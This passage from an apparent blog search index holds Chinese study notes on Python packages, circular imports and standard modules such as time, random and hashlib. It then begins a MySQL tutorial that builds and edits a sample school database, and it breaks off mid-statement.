href=\"#包的-init-文件-py\" class=\"headerlink\" title=\"包的__init__文件.py\"></a>包的__init__文件.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">__init__.py文件</span><br><span class=\"line\">当导入包的时候，默认调用__init__.py</span><br><span class=\"line\">作用：</span><br><span class=\"line\">1.当导入包时，把一些初始化的函数，变量，类定义在__init__.py文件中</span><br><span class=\"line\">2.对此文件内的函数，变量的访问，只需要通过包名.函数...</span><br><span class=\"line\">3.结合__all__ = [通过*可以访问的模块]</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># import user</span><br><span class=\"line\">#</span><br><span class=\"line\"># # from user.models import User</span><br><span class=\"line\">#</span><br><span class=\"line\"># user.creat_app()</span><br><span class=\"line\"># user.printA()</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">from 模块 import *  如果没有定义__all__，则可以使用模块里面的所有内容。</span><br><span class=\"line\">如果定义并赋值了__all__，只有__all__ = [&#x27;&#x27;, &#x27;&#x27;]列表中的内容才可以访问。</span><br><span class=\"line\"></span><br><span class=\"line\">from 包 import *  如果没有定义__all__，则该包中内容是不能访问的。</span><br><span class=\"line\">需要在__init__.py文件中定义__all__ = [可以通过*访问的模块]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">from user import *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">user = models.User(&#x27;admin&#x27;, &#x27;123456&#x27;)</span><br><span class=\"line\">user.show()</span><br><span class=\"line\"></span><br><span class=\"line\">print(test1221.MAX)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"模块的循环导入01-py\"><a href=\"#模块的循环导入01-py\" class=\"headerlink\" title=\"模块的循环导入01.py\"></a>模块的循环导入01.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">循环导入：</span><br><span class=\"line\">A模块</span><br><span class=\"line\">    def test():</span><br><span class=\"line\">        f()</span><br><span class=\"line\"></span><br><span class=\"line\">B模块</span><br><span class=\"line\">    def f():</span><br><span class=\"line\">        test()</span><br><span class=\"line\"></span><br><span class=\"line\">避免产生循环导入：</span><br><span class=\"line\">1.重新架构</span><br><span class=\"line\">2.将导入的语句放到函数里面</span><br><span class=\"line\">3.把导入的语句放到模块的最后</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">from 模块的循环导入02 import func</span><br><span class=\"line\"></span><br><span class=\"line\">def task1():</span><br><span class=\"line\">    print(&#x27;------------task1--------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def task2():</span><br><span class=\"line\">    print(&#x27;---------------task2------------&#x27;)</span><br><span class=\"line\">    func()</span><br><span class=\"line\"></span><br><span class=\"line\"># 模块内的函数调用使用__main__进行内部运行，防止循环导入时代码冗余运行</span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\"></span><br><span class=\"line\">    task1()</span><br><span class=\"line\"></span><br><span class=\"line\">    task2()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"模块的循环导入02-py\"><a href=\"#模块的循环导入02-py\" class=\"headerlink\" title=\"模块的循环导入02.py\"></a>模块的循环导入02.py</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def func():</span><br><span class=\"line\">    print(&#x27;------------func in circular import 1------1--------&#x27;)</span><br><span class=\"line\">    from 模块的循环导入01 import task1</span><br><span class=\"line\">    task1()</span><br><span class=\"line\">    print(&#x27;------------func in circular import 1------2--------&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"模块续\"><a href=\"#模块续\" class=\"headerlink\" title=\"模块续\"></a>模块续</h2><h3 id=\"sys模块-py\"><a href=\"#sys模块-py\" class=\"headerlink\" title=\"sys模块.py\"></a>sys模块.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">print(sys.path)</span><br><span class=\"line\"># 作为变量存储模块的搜索路径，变量里包含当前目录，PYTHONPATH和由安装过程决定的默认目录</span><br><span class=\"line\"></span><br><span class=\"line\">print(sys.version) # 查看解释器版本</span><br><span class=\"line\"></span><br><span class=\"line\">print(sys.argv)</span><br><span class=\"line\"># 运行程序时后面跟了参数(python xxx.py xx xx...)，argv接收这些参数并保存为一个列表</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"time模块-py\"><a href=\"#time模块-py\" class=\"headerlink\" title=\"time模块.py\"></a>time模块.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># time模块</span><br><span class=\"line\"># 1.时间戳</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">重点：</span><br><span class=\"line\">time.time()</span><br><span class=\"line\">time.sleep()</span><br><span class=\"line\">time.strftime(&#x27;format&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">了解：</span><br><span class=\"line\">time.localtime()</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">t = time.time() # 时间戳</span><br><span class=\"line\">print(t)</span><br><span class=\"line\"></span><br><span class=\"line\"># time.sleep(3)</span><br><span class=\"line\">t1 = time.time()</span><br><span class=\"line\">print(t1)</span><br><span class=\"line\"></span><br><span class=\"line\"># 将时间戳转成字符串</span><br><span class=\"line\">s = time.ctime(t)</span><br><span class=\"line\">print(s)</span><br><span class=\"line\"></span><br><span class=\"line\"># 将时间戳转成元组</span><br><span class=\"line\">t = time.localtime(t)</span><br><span class=\"line\">print(t)</span><br><span class=\"line\">print(t.tm_yday)</span><br><span class=\"line\">print(t.tm_hour)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 将元组版转成原版时间戳, 省略小数点后面数值</span><br><span class=\"line\">tt = time.mktime(t)</span><br><span class=\"line\">print(tt)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 将元组的时间转成字符串</span><br><span class=\"line\">s = time.strftime(&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span><br><span class=\"line\">print(s)</span><br><span class=\"line\"></span><br><span class=\"line\"># 将字符串转成元组的方式</span><br><span class=\"line\">r = time.strptime(&#x27;2021/03/21&#x27;, &#x27;%Y/%m/%d&#x27;)</span><br><span class=\"line\">print(r)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"datetime模块-py\"><a href=\"#datetime模块-py\" class=\"headerlink\" title=\"datetime模块.py\"></a>datetime模块.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># datetime: time模块升级版</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">time 时间</span><br><span class=\"line\">date 日期  （data数据）</span><br><span class=\"line\">datetime 日期时间 now()</span><br><span class=\"line\">timedelta 时间差 timedelta(days=xx,weeks=xx, ....)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">import datetime</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">print(datetime.time.hour) # 返回的是对象</span><br><span class=\"line\">print(time.localtime().tm_hour)</span><br><span class=\"line\"></span><br><span class=\"line\">d = datetime.date(2021,3,21)</span><br><span class=\"line\">print(d.day)</span><br><span class=\"line\">print(datetime.date.ctime(d))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(datetime.date.today())</span><br><span class=\"line\"></span><br><span class=\"line\"># 时间差</span><br><span class=\"line\">timedel = datetime.timedelta(weeks=3,hours=2)</span><br><span class=\"line\">print(timedel)</span><br><span class=\"line\"></span><br><span class=\"line\"># datetime.datetime.now() --&gt; 得到当前的日期和时间</span><br><span class=\"line\">now = datetime.datetime.now()</span><br><span class=\"line\">print(now)</span><br><span class=\"line\">result = now - timedel</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 缓存，数据redis 作为缓存  redis.set(key,value,时间差) 会话：session</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"random模块-py\"><a href=\"#random模块-py\" class=\"headerlink\" title=\"random模块.py\"></a>random模块.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">ran = random.random() # 0-1之间的随机小数</span><br><span class=\"line\">print(ran)</span><br><span class=\"line\"></span><br><span class=\"line\">ran = random.randrange(1,10,2)</span><br><span class=\"line\"># randrange(start,stop,step) 1-10 step=2--&gt;1,3,5,7,9</span><br><span class=\"line\">print(ran)</span><br><span class=\"line\"></span><br><span class=\"line\">ran = random.randint(1,10) # 包含两侧值</span><br><span class=\"line\">print(ran)</span><br><span class=\"line\"></span><br><span class=\"line\"># 随机抽签 -- 随机选择列表的内容</span><br><span class=\"line\">list1 = [&#x27;xueqiang&#x27;,&#x27;feifei&#x27;,&#x27;xiaowei&#x27;,&#x27;xiaopeng&#x27;,&#x27;xiaowen&#x27;]</span><br><span class=\"line\">ran = random.choice(list1)</span><br><span class=\"line\">print(ran)</span><br><span class=\"line\"></span><br><span class=\"line\"># 随机排序 -- 打乱顺序</span><br><span class=\"line\">pai = [&#x27;hearts A&#x27;,&#x27;diamonds K&#x27;,&#x27;clubs 6&#x27;,&#x27;spades 8&#x27;]</span><br><span class=\"line\">ran = random.shuffle(pai)</span><br><span class=\"line\">print(pai)</span><br><span class=\"line\">print(ran)</span><br><span class=\"line\"></span><br><span class=\"line\"># 验证码--字母与数字的组合</span><br><span class=\"line\"></span><br><span class=\"line\">def func():</span><br><span class=\"line\">    code = &#x27;&#x27;</span><br><span class=\"line\">    for i in range(4):</span><br><span class=\"line\">        ran1 = str(random.randint(0,9))</span><br><span class=\"line\">        ran2 = chr(random.randint(65,90))  # chr 将数字转换成ASCII码对应的字符</span><br><span class=\"line\">        ran3 = chr(random.randint(97,122))</span><br><span class=\"line\"></span><br><span class=\"line\">        r = random.choice([ran1,ran2,ran3])</span><br><span class=\"line\"></span><br><span class=\"line\">        code += r</span><br><span class=\"line\"></span><br><span class=\"line\">    return code</span><br><span class=\"line\"></span><br><span class=\"line\">code = func()</span><br><span class=\"line\">print(code)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第三方模块-py\"><a href=\"#第三方模块-py\" class=\"headerlink\" title=\"第三方模块.py\"></a>第三方模块.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(&#x27;https://www.12306.cn/&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(response.text)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"hashlib模块-py\"><a href=\"#hashlib模块-py\" class=\"headerlink\" title=\"hashlib模块.py\"></a>hashlib模块.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">print(&#x27;--------------------------标准类库----------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># chr ord</span><br><span class=\"line\"></span><br><span class=\"line\"># print(chr(65)) # Unicode码---》str</span><br><span class=\"line\"># print(type(chr(65)))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(ord(&#x27;A&#x27;)) # 字符转成Unicode码</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(ord(&#x27;上&#x27;)) # 19978</span><br><span class=\"line\"># print(ord(&#x27;下&#x27;)) # 19979</span><br><span class=\"line\"># print(type(ord(&#x27;下&#x27;)))</span><br><span class=\"line\">#</span><br><span class=\"line\"># print(chr(19978))</span><br><span class=\"line\"># print(chr(19979))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;----------------------------hashlib--------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 加密算法  md5  sha1  sha256 不可逆算法</span><br><span class=\"line\"># base64 可逆算法</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\"># msg = &#x27;xiaopeng, how about having lunch together?&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># md5 = hashlib.md5(msg.encode(&#x27;utf-8&#x27;))</span><br><span class=\"line\"># print(md5.hexdigest())</span><br><span class=\"line\"># print(len(md5.hexdigest())) # 32</span><br><span class=\"line\">#</span><br><span class=\"line\"># sha1 = hashlib.sha1(msg.encode(&#x27;utf-8&#x27;))</span><br><span class=\"line\"># print(sha1.hexdigest())</span><br><span class=\"line\"># print(len(sha1.hexdigest())) # 40</span><br><span class=\"line\">#</span><br><span class=\"line\"># sha256 = hashlib.sha256(msg.encode(&#x27;utf-8&#x27;))</span><br><span class=\"line\"># print(sha256.hexdigest())</span><br><span class=\"line\"># print(len(sha256.hexdigest())) # 64</span><br><span class=\"line\">#</span><br><span class=\"line\">#</span><br><span class=\"line\"># # 登录密码验证</span><br><span class=\"line\"># password = &#x27;123456&#x27;</span><br><span class=\"line\">#</span><br><span class=\"line\"># list1 = []</span><br><span class=\"line\">#</span><br><span class=\"line\"># sha256 = hashlib.sha256(password.encode(&#x27;utf-8&#x27;))</span><br><span class=\"line\"># list1.append(sha256.hexdigest())</span><br><span class=\"line\">#</span><br><span class=\"line\"># pwd = input(&#x27;please input password: &#x27;)</span><br><span class=\"line\"># pwd = hashlib.sha256(pwd.encode(&#x27;utf-8&#x27;))</span><br><span class=\"line\"># pwd = sha256.hexdigest()</span><br><span class=\"line\">#</span><br><span class=\"line\"># for i in list1:</span><br><span class=\"line\">#     if pwd == i:</span><br><span class=\"line\">#         print(&#x27;login success&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;------------------------------hashlib-读取hash值-------------------------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    # MD5 / SHA1 / SHA256</span><br><span class=\"line\">    digester = hashlib.md5()  # hashlib.sha1() / hashlib.sha256()</span><br><span class=\"line\">    with open(&#x27;datetime模块.py&#x27;, &#x27;rb&#x27;) as file_stream:</span><br><span class=\"line\">        file_iter = iter(lambda: file_stream.read(1024), b&#x27;&#x27;)</span><br><span class=\"line\">        for data in file_iter:</span><br><span class=\"line\">            digester.update(data)</span><br><span class=\"line\">        # data = file_stream.read(1024)</span><br><span class=\"line\">        # while data:</span><br><span class=\"line\">        #     digester.update(data)</span><br><span class=\"line\">        #     data = file_stream.read(1024)</span><br><span class=\"line\">    print(digester.hexdigest())</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"article\"><a href=\"#article\" class=\"headerlink\" title=\"article\"></a>article</h2><h3 id=\"init-py\"><a href=\"#init-py\" class=\"headerlink\" title=\"init.py\"></a><strong>init</strong>.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"models-py\"><a href=\"#models-py\" class=\"headerlink\" title=\"models.py\"></a>models.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class Article:</span><br><span class=\"line\">    def __init__(self, name, author):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.author = author</span><br><span class=\"line\"></span><br><span class=\"line\">    def show(self):</span><br><span class=\"line\">        print(&#x27;The name of article: &#123;&#125;, author is &#123;&#125;&#x27;.format(self.name, self.author))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class Tag:</span><br><span class=\"line\">    def __init__(self, name):</span><br><span class=\"line\">        self.name = name</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"views-py\"><a href=\"#views-py\" class=\"headerlink\" title=\"views.py\"></a>views.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"user\"><a href=\"#user\" class=\"headerlink\" title=\"user\"></a>user</h2><h3 id=\"init-py-1\"><a href=\"#init-py-1\" class=\"headerlink\" title=\"init.py\"></a><strong>init</strong>.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__all__ = [&#x27;models&#x27;, &#x27;test1221&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;-------------------&gt;user\\&#x27;s __init__&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def creat_app():</span><br><span class=\"line\">    print(&#x27;------------&gt; create--app&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def printA():</span><br><span class=\"line\">    print(&#x27;----------------&gt;AAAAAAA&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"models-py-1\"><a href=\"#models-py-1\" class=\"headerlink\" title=\"models.py\"></a>models.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__all__ = [&#x27;User&#x27;] # 只对 from 包.模块 import * 起作用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">version = &#x27;1.1&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class User:</span><br><span class=\"line\">    def __init__(self, username, password):</span><br><span class=\"line\">        self.username = username</span><br><span class=\"line\">        self.password = password</span><br><span class=\"line\"></span><br><span class=\"line\">    def login(self, username, password):</span><br><span class=\"line\">        if username == self.username and password == self.password:</span><br><span class=\"line\">            print(&#x27;login success&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        else:</span><br><span class=\"line\">            print(&#x27;login fail&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def publish_article(self, article):</span><br><span class=\"line\">        print(self.username, &#x27;published one article&#x27;, article.name)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    def show(self):</span><br><span class=\"line\">        print(self.username, self.password)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&#x27;----------------user------------------------&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"test1221-py\"><a href=\"#test1221-py\" class=\"headerlink\" title=\"test1221.py\"></a>test1221.py</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">from 面向对象.user.models import User</span><br><span class=\"line\"># 建议添加上一级目录名称来导入，避免出现ModuleNotFoundError: No module named &#x27;models&#x27;</span><br><span class=\"line\">from 面向对象.article.models import Article</span><br><span class=\"line\"># ImportError: attempted relative import with no known parent package</span><br><span class=\"line\"># 出现这种异常时需添加上一级目录名称</span><br><span class=\"line\"></span><br><span class=\"line\">user = User(&#x27;admin&#x27;, &#x27;123456&#x27;) # user就是通过导入User类创建的</span><br><span class=\"line\"></span><br><span class=\"line\">article = Article(&#x27;Personal summery&#x27;, &#x27;xiaowei&#x27;)</span><br><span class=\"line\">user.publish_article(article)</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [1, 3, 5, 6, 7]</span><br><span class=\"line\">from 面向对象.calculate import add</span><br><span class=\"line\"></span><br><span class=\"line\">result = add(*list1)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">MAX = 1000</span><br></pre></td></tr></table></figure>\n\n","categories":["python"],"tags":["基础"]},{"title":"mysql数据库基础","url":"/2022/08/17/mysql%E6%95%B0%E6%8D%AE%E5%BA%93/","content":"<p>– 如果存在名为school的数据库就删除它</p>\n<p>– DROP DATABASE IF EXISTS school;</p>\n<h1 id=\"–-创建名为school的数据库并指定默认的字符集为utf-8和排序方式\"><a href=\"#–-创建名为school的数据库并指定默认的字符集为utf-8和排序方式\" class=\"headerlink\" title=\"– 创建名为school的数据库并指定默认的字符集为utf-8和排序方式\"></a>– 创建名为school的数据库并指定默认的字符集为utf-8和排序方式</h1><p>CREATE DATABASE school DEFAULT charset utf8 collate utf8_bin;</p>\n<p>– 切换到school数据库</p>\n<p>USE school;</p>\n<p>– 如果存在就删除学生表</p>\n<p>DROP TABLE</p>\n<p>IF EXISTS tb_student;</p>\n<h2 id=\"–-创建学生表\"><a href=\"#–-创建学生表\" class=\"headerlink\" title=\"– 创建学生表\"></a>– 创建学生表</h2><p>CREATE TABLE tb_student (</p>\n<p>​    stuid INT NOT NULL COMMENT ‘学号’,</p>\n<p>​    stuname VARCHAR (20) NOT NULL COMMENT ‘姓名’,</p>\n<p>​    stusex bit DEFAULT 1 COMMENT ‘性别’,</p>\n<p>​    stubirth date COMMENT ‘生日’,</p>\n<p>​    stuaddr varchar(255) default ‘’ comment ‘籍贯’,</p>\n<p>​    colid int not null comment ‘所属学院’,</p>\n<p>​    PRIMARY KEY (stuid),</p>\n<p>​    foreign key (colid) REFERENCES tb_college (colid)</p>\n<p>);</p>\n<h2 id=\"–-修改学生表\"><a href=\"#–-修改学生表\" class=\"headerlink\" title=\"– 修改学生表\"></a>– 修改学生表</h2><p>ALTER TABLE tb_student ADD COLUMN stuaddr VARCHAR (255);</p>\n<p>– 同第21行</p>\n<p>– ALTER TABLE tb_student CHANGE COLUMN stuaddr stuaddr VARCHAR (511);</p>\n<p>ALTER TABLE tb_student DROP COLUMN stuaddr;</p>\n<h2 id=\"–-向学生表插入数据\"><a href=\"#–-向学生表插入数据\" class=\"headerlink\" title=\"– 向学生表插入数据\"></a>– 向学生表插入数据</h2><p>INSERT INTO tb_student</p>\n<p>VALUES</p>\n<p>​    (</p>\n<p>​       1001,</p>\n<p>​       ‘张三丰’,</p>\n<p>​       1,</p>\n<p>​       ‘1982-2-2’,</p>\n<p>​       ‘湖北十堰’,</p>\n<p>​       1</p>\n<p>​    );</p>\n<p>INSERT INTO tb_student</p>\n<p>VALUES</p>\n<p>​    (</p>\n<p>​       1002,</p>\n<p>​       ‘张三丰’,</p>\n<p>​       1,</p>\n<p>​       ‘1982-2-2’,</p>\n<p>​       ‘湖北十堰’,</p>\n<p>​       3</p>\n<p>​    );</p>\n<p>INSERT INTO tb_student (stuid, stuname)</p>\n<p>VALUES</p>\n<p>​    (1003, ‘张翠山’);</p>\n<p>INSERT INTO tb_student (stusex, stuid, stuname)</p>\n<p>VALUES</p>\n<p>​    (0, 1004, ‘殷素素’);</p>\n<p>INSERT INTO tb_student (stusex, stuid, stuname)</p>\n<p>VALUES</p>\n<p>​    (DEFAULT, 1005, ‘杨逍’),</p>\n<p>​    (1, 1006, ‘谢逊’),</p>\n<p>​    (0, 1007, ‘杨不悔’);</p>\n<p>INSERT INTO tb_student (stusex, stuid, stuname, stubirth, stuaddr)</p>\n<p>VALUES</p>\n<p>​    (0, 1008, ‘周芷若’, ‘1992-04-15’, ‘湖南长沙’),</p>\n<p>​    (1, 1009, ‘范瑶’, ‘1990-03-20’, ‘湖北武汉’);</p>\n<h2 id=\"–-截断表（删除全表）\"><a href=\"#–-截断表（删除全表）\" class=\"headerlink\" title=\"– 截断表（删除全表）\"></a>– 截断表（删除全表）</h2><p>– truncate table tb_student;</p>\n<p>– 删除学号为1002的学生</p>\n<p>delete from tb_student where stuid=1002;</p>\n<p>– 删除所有女学生</p>\n<p>– delete from tb_student where stusex=0;</p>\n<h2 id=\"–-更新操作\"><a href=\"#–-更新操作\" class=\"headerlink\" title=\"– 更新操作\"></a>– 更新操作</h2><p>– update tb_student set stuaddr=’四川成都’ where stuid=1005 or stuid=1006;</p>\n<p>update tb_student set stuaddr=’四川成都’ where stuid in (1005,1006);</p>\n<p>update tb_student set stubirth=’1998-12-30’, stuaddr=’山西大同’ where stuid=1007;</p>\n<p>– 创建学院表</p>\n<p>create table tb_college</p>\n<p>(</p>\n<p>colid int auto_increment comment ‘编号’,</p>\n<p>colname varchar(31) not null comment ‘名称’,</p>\n<p>website varchar(1023) comment ‘网址’,</p>\n<p>primary key (colid)</p>\n<p>);</p>\n<p>ALTER TABLE tb_college ADD COLUMN colmaster VARCHAR (255);</p>\n<p>update tb_college set website=’<a href=\"http://www.abc.com&/#39;\">http://www.abc.com&#39;</a>, colmaster=’左冷禅’ where colid=1;</p>\n<p>update tb_college set website=’<a href=\"http://www.xyz.com&/#39;\">http://www.xyz.com&#39;</a>, colmaster=’岳不群’ where colid=2;</p>\n<p>update tb_college set website=’<a href=\"http://www.foo.com&/#39;\">http://www.foo.com&#39;</a>, colmaster=’风清扬’ where colid=3;</p>\n<p>– 插入学院记录</p>\n<p>– 实体：学生、学院</p>\n<p>– 关系：属于</p>\n<p>– 重数：多对一</p>\n<p>insert into tb_college (colname) VALUES</p>\n<p>(‘计算机学院’),</p>\n<p>(‘外国语学院’),</p>\n<p>(‘经济管理学院’);</p>\n<p>– 同第22行</p>\n<p>– alter table tb_student add column colid int;</p>\n<h2 id=\"–-修改学生表添加外键约束-参照完整性\"><a href=\"#–-修改学生表添加外键约束-参照完整性\" class=\"headerlink\" title=\"– 修改学生表添加外键约束(参照完整性)\"></a>– 修改学生表添加外键约束(参照完整性)</h2><p>– 同第24行</p>\n<p>– alter table tb_student add constraint fk_student_colid foreign key (colid) REFERENCES tb_college (colid);</p>\n<p>– 删除外键约束</p>\n<p>– alter table tb_student drop foreign key fk_student_colid;</p>\n<p>– 没有定义外键约束名称时先查看该表信息再删除</p>\n<p>SHOW CREATE TABLE tb_score;</p>\n<p>alter table tb_score drop foreign key tb_score_ibfk_1;</p>\n<p>– 添加外键约束时增加级联操作-restrict不允许操作-cascade级联操作-set null设置为null</p>\n<p>– alter table tb_student add constraint fk_student_colid foreign key (colid) REFERENCES tb_college (colid) on delete cascade/restrict/set null on update cascade;</p>\n<p>update tb_student set colid=1 where stuid between 1001 and 1006;</p>\n<p>update tb_student set colid=2 where stuid in (1007, 1008);</p>\n<p>update tb_student set colid=3 where stuid=1009;</p>\n<p>– 创建教师表</p>\n<p>create table tb_teacher</p>\n<p>(</p>\n<p>teaid int not null comment ‘工号’,</p>\n<p>teaname varchar(20) not null comment ‘姓名’,</p>\n<p>teatitle varchar(10) default ‘助教’ comment ‘职称’,</p>\n<p>colid int not null comment ‘所属学院’,</p>\n<p>PRIMARY key (teaid),</p>\n<p>FOREIGN key (colid) REFERENCES tb_college (colid)</p>\n<p>);</p>\n<p>– 创建课程表</p>\n<p>create table tb_course</p>\n<p>(</p>\n<p>couid int not null comment ‘编号’,</p>\n<p>couname varchar(50) not null comment ‘名称’,</p>\n<p>coucredit int not null comment ‘学分’,</p>\n<p>teaid int not null comment ‘授课老师’,</p>\n<p>PRIMARY key (couid),</p>\n<p>FOREIGN key (teaid) REFERENCES tb_teacher (teaid)</p>\n<p>);</p>\n<p>– 创建选课记录表</p>\n<p>create table tb_score</p>\n<p>(</p>\n<p>scid int auto_increment comment ‘选课记录编号’, ##创建自动增进编号需定义主键(primary key)</p>\n<p>stuid int not null comment ‘选课学生’,</p>\n<p>couid int not null comment ‘所选课程’,</p>\n<p>scdate datetime comment ‘选课时间日期’,</p>\n<p>scmark decimal(4,1) comment ‘考试成绩’,</p>\n<p>primary key (scid),</p>\n<p>foreign key (stuid) REFERENCES tb_student (stuid),</p>\n<p>foreign key (couid) REFERENCES tb_course (couid)</p>\n<p>);</p>\n<p>ALTER TABLE tb_score drop COLUMN scid;</p>\n<p>– 添加唯一性约束（一个学生选某个课程只能选一次）</p>\n<p>alter table tb_score add CONSTRAINT uni_score_stuid_couid</p>\n<p>unique (stuid,couid);</p>\n<p>– 插入学院数据</p>\n<p>– 同第98-111行</p>\n<p>insert into tb_college</p>\n<p>(colname, colmaster, website) VALUES</p>\n<p>(‘计算机学院’,’左冷禅’,’<a href=\"http://www.abc.com&/#39;\">http://www.abc.com&#39;</a>),</p>\n<p>(‘外国语学院’,’岳不群’,’<a href=\"http://www.xyz.com&/#39;\">http://www.xyz.com&#39;</a>),</p>\n<p>(‘经济管理学院’,’风清扬’,’<a href=\"http://www.foo.com&/#39;\">http://www.foo.com&#39;</a>);</p>\n<p>– 插入学生数据</p>\n<p>insert into tb_student</p>\n<p>(stuid,stuname,stusex,stubirth,stuaddr,colid) VALUES</p>\n<p>(1010,’向问天’,1,’1990-03-04’,’四川成都’,1),</p>\n<p>(1011,’任我行’,1,’1992-02-02’,’湖南长沙’,1);</p>\n<p>update tb_student set stubirth=’1994-03-06’, stuaddr=’贵州贵阳’ where stuid=1003;</p>\n<p>update tb_student set stubirth=’1989-06-06’, stuaddr=’广西南宁’ where stuid=1004;</p>\n<p>update tb_student set stubirth=’1991-02-06’ where stuid=1005;</p>\n<p>update tb_student set stubirth=’1992-02-02’ where stuid=1006;</p>\n<p>– 插入教师数据</p>\n<p>insert into tb_teacher</p>\n<p>(teaid,teaname,teatitle,colid) 